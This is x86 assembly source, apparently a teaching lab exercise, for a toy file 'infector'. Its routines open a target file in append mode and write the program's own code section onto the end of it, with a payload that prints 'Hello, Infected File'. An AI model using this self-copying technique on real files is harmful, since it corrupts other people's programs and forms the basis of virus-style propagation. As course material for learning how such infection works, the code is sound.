

; section .text

global _start
global infector
global infection
global system_call

extern main

SYS_WRITE equ 4
SYS_OPEN equ 5
SYS_CLOSE equ 6

O_APPEND equ 1024
O_RDWR equ 2

STDOUT equ 1


_start:
	pop dword ecx    ; ecx = argc
	mov esi, esp      ; esi = argv
	;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
	mov eax, ecx     ; put the number of arguments into eax
	shl eax, 2       ; compute the size of argv in bytes
	add eax, esi     ; add the size to the address of argv 
	add eax, 4       ; skip NULL at the end of argv
	push dword eax   ; char *envp[]
	push dword esi   ; char* argv[]
	push dword ecx   ; int argc

	call    main        ; int main( int argc, char *argv[], char *envp[] )

	mov ebx, eax
	mov eax, 1
	int 0x80
	nop


system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state
    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
	msg: db "Hello, Infected File", 0x0a
	len equ $ - msg ; length of string


	; infection(int)
	infection:
		push len
		push msg
		push STDOUT
		push SYS_WRITE
		call system_call_and_clean

		ret


	; infector(char*)
	infector:
		push ebp
		mov ebp,esp

		sub esp, 4 ; int descriptor
		; ; pushad

		push dword [ebp+8] ; arg1 = pointer to file path string
		call open_append_file
		add esp, 4

		mov dword [ebp-4], eax ; descriptor = eax

		push dword eax ; arg1 = descriptor
		call infect_file
		add esp, 4

		push dword [ebp-4] ; arg1 = descriptor
		call close_file
		add esp, 4

		; ; popad
		add esp, 4 ; remove descriptor from stack
		mov eax, [ebp-4]

		pop ebp
		ret


; int open_file(char*)
open_append_file:
	push ebp
	mov ebp, esp

	push dword 0
	push dword O_RDWR | O_APPEND
	push dword [ebp+8] ; pointer to file name (this function's argument)
	push SYS_OPEN
	call system_call_and_clean

	pop ebp
	ret


; int close_file(descriptor)
close_file:
	push ebp
	mov ebp, esp

	push dword 0
	push dword 0
	push dword [ebp+8] ; param1 = descriptor
	push SYS_CLOSE
	call system_call_and_clean

	pop ebp
	ret


; void infect_file(int fileDescriptor)
infect_file:
	push ebp
	mov ebp, esp

	push dword code_end - code_start
	push dword code_start
	push dword [ebp+8] ; param1 = fileDescriptor
	push SYS_WRITE
	call system_call_and_clean
	
	pop ebp
	ret


; makes a sys_call and cleans arguments from stack
system_call_and_clean:
	pop edi

	call system_call
	add esp, 4*4
	
	push edi
	ret


code_end: